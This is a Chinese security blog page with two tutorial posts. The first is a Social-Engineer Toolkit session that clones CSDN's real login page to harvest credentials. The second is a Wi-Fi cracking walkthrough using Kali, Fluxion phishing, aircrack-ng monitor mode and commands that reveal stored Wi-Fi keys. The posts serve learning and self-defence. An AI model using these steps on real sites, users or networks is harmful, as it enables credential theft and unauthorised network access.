class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMss<span class="string">''</span><span class="string">'                          '</span><span class="string">''</span>ssMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMyy<span class="string">''</span>                                    <span class="string">''</span>yyMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMyy<span class="string">''</span>                                            <span class="string">''</span>yyMMMMMMMM   XX</span><br><span class="line">XX   MMMMMy<span class="string">''</span>                                                    <span class="string">''</span>yMMMMM   XX</span><br><span class="line">XX   MMMy<span class="string">'                                                          '</span>yMMM   XX</span><br><span class="line">XX   Mh<span class="string">'                                                              '</span>hM   XX</span><br><span class="line">XX   -                                                                  -   XX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XX   ::                                                                ::   XX</span><br><span class="line">XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX</span><br><span class="line">XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX</span><br><span class="line">XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX</span><br><span class="line">XX   MMMMMM MMmm<span class="string">''</span>      <span class="string">'mmMMMMMMMMyy.  .yyMMMMMMMMmm'</span>      <span class="string">''</span>mmMM MMMMMM   XX</span><br><span class="line">XX   ---mMM <span class="string">''</span>             <span class="string">'mmMMMMMMMM  MMMMMMMMmm'</span>             <span class="string">''</span> MMm---   XX</span><br><span class="line">XX   yyyym<span class="string">'    .              '</span>mMMMMm<span class="string">'  '</span>mMMMMm<span class="string">'              .    '</span>myyyy   XX</span><br><span class="line">XX   mm<span class="string">''</span>    .y<span class="string">'     ..yyyyy..  '</span><span class="string">''</span><span class="string">'      '</span><span class="string">''</span><span class="string">'  ..yyyyy..     '</span>y.    <span class="string">''</span>mm   XX</span><br><span class="line">XX           <span class="keyword">MN</span>    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX</span><br><span class="line">XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX</span><br><span class="line">XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX</span><br><span class="line">XX              o+++     ++++Mo    M      M    oM++++     +++o              XX</span><br><span class="line">XX                                oo      oo                                XX</span><br><span class="line">XX           oM                 oo          oo                 Mo           XX</span><br><span class="line">XX         oMMo                M              M                oMMo         XX</span><br><span class="line">XX       +MMMM                 s              s                 MMMM+       XX</span><br><span class="line">XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX</span><br><span class="line">XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX</span><br><span class="line">XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX</span><br><span class="line">XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX</span><br><span class="line">XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX</span><br><span class="line">XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX</span><br><span class="line">XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX</span><br><span class="line">XX   MMMMd   <span class="string">''</span><span class="string">''</span>hhhhh       odddo          obbbo        hhhh<span class="string">''</span><span class="string">''</span>   dMMMM   XX</span><br><span class="line">XX   MMMMMd             <span class="string">'hMMMMMMMMMMddddddMMMMMMMMMMh'</span>             dMMMMM   XX</span><br><span class="line">XX   MMMMMMd              <span class="string">'hMMMMMMMMMMMMMMMMMMMMMMh'</span>              dMMMMMM   XX</span><br><span class="line">XX   MMMMMMM-               <span class="string">''</span>ddMMMMMMMMMMMMMMdd<span class="string">''</span>               -MMMMMMM   XX</span><br><span class="line">XX   MMMMMMMM                   <span class="string">'::dddddddd::'</span>                   MMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMM-                                                  -MMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMM                                                  MMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMy                                                yMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">    .o88o.                               o8o                .</span><br><span class="line">    <span class="number">888</span> `<span class="string">"                               `"</span><span class="string">'              .o8</span></span><br><span class="line"><span class="string">   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo</span></span><br><span class="line"><span class="string">    888    d88(  "8 d88'</span> `<span class="number">88</span>b d<span class="number">88</span><span class="string">' `"Y8 `888  d88'</span> `<span class="number">88</span>b   <span class="number">888</span>    `<span class="number">88</span>.  <span class="number">.8</span><span class="string">'</span></span><br><span class="line"><span class="string">    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'</span></span><br><span class="line">    <span class="number">888</span>    o.  )<span class="number">88</span>b <span class="number">888</span>   <span class="number">888</span> <span class="number">888</span>   .o<span class="number">8</span>  <span class="number">888</span>  <span class="number">888</span>    .o   <span class="number">888</span> .    `<span class="number">888</span><span class="string">'</span></span><br><span class="line"><span class="string">   o888o   8""888P'</span> `Y8bod8P<span class="string">' `Y8bod8P'</span> o888o `Y8bod8P<span class="string">'   "888"      d8'</span></span><br><span class="line">                                                                .o...<span class="keyword">P</span><span class="string">'</span></span><br><span class="line"><span class="string">                                                                `XER0'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[---]        The Social-Engineer Toolkit (SET)         [---]</span><br><span class="line">[---]        Created by: David Kennedy (ReL1K)         [---]</span><br><span class="line">                      Version: <span class="number">7</span><span class="number">.7</span><span class="number">.9</span></span><br><span class="line">                   Codename: <span class="string">'Blackout'</span></span><br><span class="line">[---]        Follow us on Twitter: @TrustedSec         [---]</span><br><span class="line">[---]        Follow me on Twitter: @HackingDave        [---]</span><br><span class="line">[---]       Homepage: https:<span class="comment">//www.trustedsec.com       [---]</span></span><br><span class="line"><span class="comment">        Welcome to the Social-Engineer Toolkit (SET).</span></span><br><span class="line"><span class="comment">         The one stop shop for all of your SE needs.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     Join us on irc.freenode.net in channel #setoolkit</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The Social-Engineer Toolkit is a product of TrustedSec.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           Visit: https://www.trustedsec.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   It's easy to update using the PenTesters Framework! (PTF)</span></span><br><span class="line"><span class="comment">Visit https://github.com/trustedsec/ptf to update all your tools!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> Select from the menu:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   1) Spear-Phishing Attack Vectors</span></span><br><span class="line"><span class="comment">   2) Website Attack Vectors</span></span><br><span class="line"><span class="comment">   3) Infectious Media Generator</span></span><br><span class="line"><span class="comment">   4) Create a Payload and Listener</span></span><br><span class="line"><span class="comment">   5) Mass Mailer Attack</span></span><br><span class="line"><span class="comment">   6) Arduino-Based Attack Vector</span></span><br><span class="line"><span class="comment">   7) Wireless Access Point Attack Vector</span></span><br><span class="line"><span class="comment">   8) QRCode Generator Attack Vector</span></span><br><span class="line"><span class="comment">   9) Powershell Attack Vectors</span></span><br><span class="line"><span class="comment">  10) SMS Spoofing Attack Vector</span></span><br><span class="line"><span class="comment">  11) Third Party Modules</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return back to the main menu.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set&gt; 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   1) Java Applet Attack Method</span></span><br><span class="line"><span class="comment">   2) Metasploit Browser Exploit Method</span></span><br><span class="line"><span class="comment">   3) Credential Harvester Attack Method</span></span><br><span class="line"><span class="comment">   4) Tabnabbing Attack Method</span></span><br><span class="line"><span class="comment">   5) Web Jacking Attack Method</span></span><br><span class="line"><span class="comment">   6) Multi-Attack Web Method</span></span><br><span class="line"><span class="comment">   7) Full Screen Attack Method</span></span><br><span class="line"><span class="comment">   8) HTA Attack Method</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return to Main Menu</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt;3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The first method will allow SET to import a list of pre-defined web</span></span><br><span class="line"><span class="comment"> applications that it can utilize within the attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The second method will completely clone a website of your choosing</span></span><br><span class="line"><span class="comment"> and allow you to utilize the attack vectors within the completely</span></span><br><span class="line"><span class="comment"> same web application you were attempting to clone.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The third method allows you to import your own website, note that you</span></span><br><span class="line"><span class="comment"> should only have an index.html when using the import website</span></span><br><span class="line"><span class="comment"> functionality.</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   1) Web Templates</span></span><br><span class="line"><span class="comment">   2) Site Cloner</span></span><br><span class="line"><span class="comment">   3) Custom Import</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return to Webattack Menu</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt;2</span></span><br><span class="line"><span class="comment">[-] Credential harvester will allow you to utilize the clone capabilities within SET</span></span><br><span class="line"><span class="comment">[-] to harvest credentials or parameters from a website as well as place them into a report</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The way that this works is by cloning a site and looking for form fields to</span></span><br><span class="line"><span class="comment">rewrite. If the POST fields are not usual methods for posting forms this </span></span><br><span class="line"><span class="comment">could fail. If it does, you can always save the HTML, rewrite the forms to</span></span><br><span class="line"><span class="comment">be standard forms and use the "IMPORT" feature. Additionally, really </span></span><br><span class="line"><span class="comment">important:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL</span></span><br><span class="line"><span class="comment">IP address below, not your NAT address. Additionally, if you don't know</span></span><br><span class="line"><span class="comment">basic networking concepts, and you have a private IP address, you will</span></span><br><span class="line"><span class="comment">need to do port forwarding to your NAT IP address from your external IP</span></span><br><span class="line"><span class="comment">address. A browser doesns't know how to communicate with a private IP</span></span><br><span class="line"><span class="comment">address, so if you don't specify an external IP address if you are using</span></span><br><span class="line"><span class="comment">this from an external perpective, it will not work. This isn't a SET issue</span></span><br><span class="line"><span class="comment">this is how networking works.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [192.168.31.103]:</span></span><br><span class="line"><span class="comment">[-] SET supports both HTTP and HTTPS</span></span><br><span class="line"><span class="comment">[-] Example: http://www.thisisafakesite.com</span></span><br><span class="line"><span class="comment">set:webattack&gt; Enter the url to clone:https://passport.csdn.net/login</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[*] Cloning the website: https://passport.csdn.net/login</span></span><br><span class="line"><span class="comment">[*] This could take a little bit...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The best way to use this attack is if username and password form</span></span><br><span class="line"><span class="comment">fields are available. Regardless, this captures all POSTs on a website.</span></span><br><span class="line"><span class="comment">[*] You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.</span></span><br><span class="line"><span class="comment">Press &#123;return&#125; if you understand what we're saying here.</span></span><br><span class="line"><span class="comment">[*] The Social-Engineer Toolkit Credential Harvester Attack</span></span><br><span class="line"><span class="comment">[*] Credential Harvester is running on port 80</span></span><br><span class="line"><span class="comment">[*] Information will be displayed to you as it arrives below:</span></span><br><span class="line"><span class="comment">directory traversal attempt detected from: 192.168.31.103</span></span><br><span class="line"><span class="comment">192.168.31.103 - - [14/Dec/2018 19:08:55] "GET /api/v4/search/preset_words HTTP/1.1" 404 -</span></span><br><span class="line"><span class="comment">192.168.31.103 - - [14/Dec/2018 19:08:58] "GET / HTTP/1.1" 200 -</span></span><br></pre></td></tr></table></figure>
<center>------------------------------------------分割线------------------------------------------</center>

<p>有点累了，后面的内容日后有时间再来更新吧。</p>
<div style="text-align: right">2018-12-14,By Zero</div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/10/12/WIFI破解/">WIFI破解</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-10-12
        </span><span class="post-category">
            <a href="/categories/白帽子/">白帽子</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h2 id="免责申明"><a href="#免责申明" class="headerlink" title="免责申明"></a>免责申明</h2><p>正如<a href="https://book.douban.com/subject/10433737/" target="_blank" rel="noopener">《Metasploit渗透测试指南》</a>一书所述：</p>
<ul>
<li>不要进行恶意的攻击</li>
<li>不要做傻事</li>
<li>在没有获得书面授权时，不要攻击任何目标</li>
<li>考虑你的行为将会带来的后果</li>
<li>如果你干了些非法的事情，天网恢恢疏而不漏，你总会被抓到牢里的</li>
</ul>
<font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。</font>

<p><img src="http://ww4.sinaimg.cn/bmiddle/006APoFYjw1fa506lcjg8j30b40b4aat.jpg" width="300"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前，无论是在家，还是在校，亦或是各种商场，无线wifi都是星罗棋布。但你是否注意到，像CMCC、ChinaNet，亦或是其他一些表面上看上去比较信得过的wifi名（BSSID）很是常见，尤其是在人流量高、人口密度大的区域。此时的你或许会感到疑惑，但是当你看见Free字样再加上你目前对wifi的需求，一时昏了头的你可能就管不了那么多了（管他三七二十一，连上再说，Free的wifi不要白不要，我傻啊！！！）。令你始料未及的是一旦当你client那些钓鱼wifi之后，你的手机内的一切的一切的信息都在对方的掌控之中，比如说照片、通讯录、各种应用密码等，我们换句话说，你的手机在这一瞬间就相当于有了第二个主人。</p>
<p>综上，在这鱼龙混杂的万千世界中了解一些网络安全的知识对于每个人来说都是有必要的。本文主要介绍无线渗透中的关于wifi破解一些常用方法以此加强您的自我防护意识。</p>
<hr>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><ul>
<li>系统：<a href="https://www.kali.org/" target="_blank" rel="noopener">Kali Linux</a><br>可在其官网了解相关信息及下载iso镜像文件。</li>
<li>USB无线网卡<br>笔电内置的无线网卡不可用于Kali Linux的无线学习，我们需要购买一个外置的USB无线网卡，可根据自己的需要在<a href="https://www.taobao.com/" target="_blank" rel="noopener">某宝</a>进行购买。本文使用的是RT3070，购买链接是：<a href="https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail" target="_blank" rel="noopener">https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail</a></li>
</ul>
<h3 id="Kali安装及基本配置"><a href="#Kali安装及基本配置" class="headerlink" title="Kali安装及基本配置"></a>Kali安装及基本配置</h3><h4 id="Kali安装"><a href="#Kali安装" class="headerlink" title="Kali安装"></a>Kali安装</h4><p>目前主要使用的渗透工具主要有两种，一个是Backtrack，另一个是Kali，两者在使用上来讲并无差别，在本文中使用的是Kali Linux系统。</p>
<p>Kali官网及下载地址：<a href="https://www.kali.org/" target="_blank" rel="noopener">https://www.kali.org/</a></p>
<p>在官网下载好Kali Linux iso镜像文件之后，我们需要将其进行安装，一般有U盘安装、虚拟机安装、双系统等方式。本文只介绍VMware虚拟机中安装Kali的方式，有其他需要的朋友可自行查找相关资料。</p>
<p>Kali的安装总的来说和Ubuntu的安装并无一二，安装kali可暂且移步：<a href="https://jacklxj.github.io/2018/09/23/Xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E5%B9%B6%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEipython%E6%9C%8D%E5%8A%A1/" target="_blank" rel="noopener">Xshell远程连接linux并远程访问Jupyter notebook服务（深度学习环境的搭建）</a>，如下所示部分：<br><img src="http://pjq6e477y.bkt.clouddn.com/1.jpg" width="400"></p>
<p>在这里值得一说的是，在Kali安装的最后一步中，会有两个选择，一个是<code>手动输入设备</code>，另一个是<code>/dev/sda</code>，在这里我们务必选择<code>/dev/sda</code>，选择之后待其自动重启即可使用。</p>
<h4 id="Kali的基本配置"><a href="#Kali的基本配置" class="headerlink" title="Kali的基本配置"></a>Kali的基本配置</h4><blockquote>
<p>该部分内容以后有时间单独成文记录。</p>
</blockquote>
<h3 id="Fluxion安装"><a href="#Fluxion安装" class="headerlink" title="Fluxion安装"></a>Fluxion安装</h3><p>Fluxion的官方部分说明如下：</p>
<blockquote>
<p>Fluxion is a security auditing and social-engineering research tool. It is a remake of linset by vk496 with (hopefully) fewer bugs and more functionality. The script attempts to retrieve the WPA/WPA2 key from a target access point by means of a social engineering (phishing) attack. It’s compatible with the latest release of Kali (rolling). Fluxion’s attacks’ setup is mostly manual, but experimental auto-mode handles some of the attacks’ setup parameters. Read the FAQ before requesting issues.</p>
</blockquote>
<p>总的来说，Fluxion不同于一般的暴力wifi破解，它是通过社会工程学来获取WPA2秘钥。</p>
<p>Github地址：<a href="https://github.com/wi-fi-analyzer/fluxion.git" target="_blank" rel="noopener">https://github.com/wi-fi-analyzer/fluxion.git</a><br>官网地址：<a href="https://fluxionnetwork.github.io/fluxion/" target="_blank" rel="noopener">https://fluxionnetwork.github.io/fluxion/</a></p>
<p>在安装Kali Linux之后，虽然其就像Anaconda一样集成了大量的工具，但是默认是没有对Fluxion进行安装的，所以需要我们自行安装，此处安装使用git即可，命令如下：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/wi-fi-analyzer/fluxion.git</span><br></pre></td></tr></table></figure></p>
<p>不到一杯茶的功夫即可完成该下载过程。<br><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1504001096,2238756502&fm=26&gp=0.jpg"></p>
<hr>
<h2 id="WIFI破解"><a href="#WIFI破解" class="headerlink" title="WIFI破解"></a>WIFI破解</h2><h3 id="万能钥匙获取wifi秘钥"><a href="#万能钥匙获取wifi秘钥" class="headerlink" title="万能钥匙获取wifi秘钥"></a>万能钥匙获取wifi秘钥</h3><p>在wifi破解中，相信大家接触最多的就是万能钥匙了，但是只限连接部分的查询结果wifi，而且连接成功后绝大部分人并不知道连接的wifi密码，所以先从万能钥匙说起，由于万能钥匙不是本文的重点，所以在这只蜻蜓点水般介绍即可。</p>
<p>在连接万能钥匙之后，我们可以通过以下三种方式来获取秘钥。</p>
<ul>
<li>RE获取<br>进入RE管理器（手机默认文件管理器），打开<code>/data/misc/wpa_supplicant.conf</code>文件可见<code>psk</code>字段，即wifi明文秘钥。（操作前提需要ROOT）</li>
<li>微信获取<br>打开手机并进入无线wlan界面，点击你使用万能钥匙连接的wifi可见一个二维码，保存该二维码之后可使用微信进行扫描，扫描结果可见此wifi明文秘钥。</li>
<li>电脑获取<br>在终端使用如下命令可见秘钥<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show<span class="built_in"> profile </span>name=[wifi名] <span class="attribute">key</span>=<span class="string">"clear"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Kali暴力破解"><a href="#Kali暴力破解" class="headerlink" title="Kali暴力破解"></a>Kali暴力破解</h3><h4 id="airmon-ng监听"><a href="#airmon-ng监听" class="headerlink" title="airmon-ng监听"></a><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener">airmon-ng</a>监听</h4><p>插上USB无线网卡之后，我们将需要该网卡连接至Kali Linux系统中才能正常侦测到周围wifi，可根据<code>虚拟机 -&gt; 可移动设备 -&gt; USB连接</code>进行操作，如下图所示（这张图不太好截，手机拍的，根据图片操作即可）：<br><img src="/uploads/wifi破解/2.jpg" width="400"></p>
<p>之后，我们需要确认是否已经网卡的引入，可通过如下命令进行操作：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig -a</span></span><br></pre></td></tr></table></figure></p>
<p>输出结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/3.jpg" width="400"></p>
<p>若命令输出<code>wlan0</code>网卡，则说明已经映射成功，之后我们即可启动该网卡来进一步的进行侦测周围wifi，启动如下可根据如下命令进行（三部曲）：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭network-manager服务，已避免对网卡造成不必要的影响</span></span><br><span class="line">service network-manager stop </span><br><span class="line"><span class="comment"># 我们在使用暴力破解wifi时，会使用到airmon-ng，该命令可将对airmon-ng产生影响的进程kill掉</span></span><br><span class="line">airmon-ng check kill </span><br><span class="line"><span class="comment"># 启动wlan0网卡，处于监听（monitor）状态</span></span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p>
<p><img src="http://pjq6e477y.bkt.clouddn.com/5.jpg" width="400"></p>
<p>补充：</p>
<blockquote>
<p>查看影响<code>airmon-ng</code>使用的进程：<code>airmon-ng check</code><br>关闭监听（monitor）状态：<code>airmon-ng stop wlan0mon</code><br>重启<code>network-manager</code>服务：service network-manager restart<br>当无线网卡无法继续监听时，可尝试一下操作（重启）：</p>
<ol>
<li>ifconfig wlan0mon down</li>
<li>ifconfig wlan0mon up</li>
</ol>
</blockquote>
<h4 id="airodump-ng-探测"><a href="#airodump-ng-探测" class="headerlink" title="airodump-ng 探测"></a><a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a> 探测</h4><p>在使用USB无线网卡监听之后，我们就能对周围的wifi进行探测了，该过程可以探测到包含了wifi的详细信息：BSSID、ESSID、信道等，对周围所有的wifi进行探测的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p>
<p>命令执行结果如下图所示：<br><img src="http://pjq6e477y.bkt.clouddn.com/6.jpg" width="400"></p>
<p>结果分析：</p>
<blockquote>
<p>BSSID：<code>Service Set Identifier</code>，站点的MAC地址，用于区分不同的网络，可理解为路由器的身份证<br>PWR：可理解为信号强度的体现，绝对值越小信号越强<br>Beacons：连接该wifi（AP）所发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现。<br>#Data：数据传输量<br>#/s：过去10秒钟内每秒捕获数据分组的数量。<br>CH：信道<br>MB：AP的最大传输速率<br>ENC：加密方式<br>CIPHER：检测到的加密算法。这个不是特别懂。<br>AUTH：认证协议<br>ESSID：侦测到的wifi名</p>
</blockquote>
